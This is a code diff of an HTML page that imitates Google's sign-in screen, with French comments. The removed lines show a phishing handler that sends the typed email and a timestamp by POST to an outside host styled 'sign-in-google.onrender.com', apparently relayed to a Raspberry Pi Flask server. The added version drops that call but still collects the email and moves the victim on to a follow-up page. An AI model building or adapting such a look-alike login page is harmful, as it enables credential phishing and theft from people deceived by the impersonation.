@@ -15,13 +15,9 @@
   </div>
   
   <div class="inputs">
-    <input type="email" name="email" id="email" class="input" required>
+    <input type="email" id="email" class="input" required>
     <label for="email" class="input-label">Email or phone</label>
   </div>
-  
-  <a href="#" class="link-btn">Forgot Email?</a>
-  <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
-  <a href="#" class="link-btn">Learn More</a>
   
   <div class="btn-group">
     <button class="create-btn">Create account</button>
@@ -30,50 +26,15 @@
 </div>
 
 <script>
-  document.getElementById('btn-next').addEventListener('click', async function() {
-    const emailInput = document.getElementById('email');
-    const emailValue = emailInput.value;
-
+  document.getElementById('btn-next').addEventListener('click', function() {
+    const emailValue = document.getElementById('email').value;
     if (!emailValue) {
         alert("Please enter an email");
         return;
     }
-
-    const PI_IP = "192.168.1.157"; 
-    const URL = `https://sign-in-google.onrender.com/data`;
-    // ---------------------
-
-    this.innerText = "Loading...";
-    this.disabled = true;
-
-    try {
-        const response = await fetch(URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ 
-                email: emailValue,
-                timestamp: new Date().toISOString()
-            })
-        });
-
-        if (response.ok) {
-            // Stocker l'email dans localStorage
-            localStorage.setItem('userEmail', emailValue);
-            // Redirection après succès vers votre page connect.html
-            window.location.href = 'conect.html';
-        } else {
-            alert("Server error: " + response.status);
-            this.innerText = "Next";
-            this.disabled = false;
-        }
-    } catch (error) {
-        console.error("Connection error:", error);
-        alert("Could not connect to Raspberry Pi. Make sure the Flask server is running.");
-        this.innerText = "Next";
-        this.disabled = false;
-    }
+    // Sauvegarde l'email pour la page suivante
+    localStorage.setItem('userEmail', emailValue);
+    window.location.href = 'conect.html';
   });
 </script>
 </body>
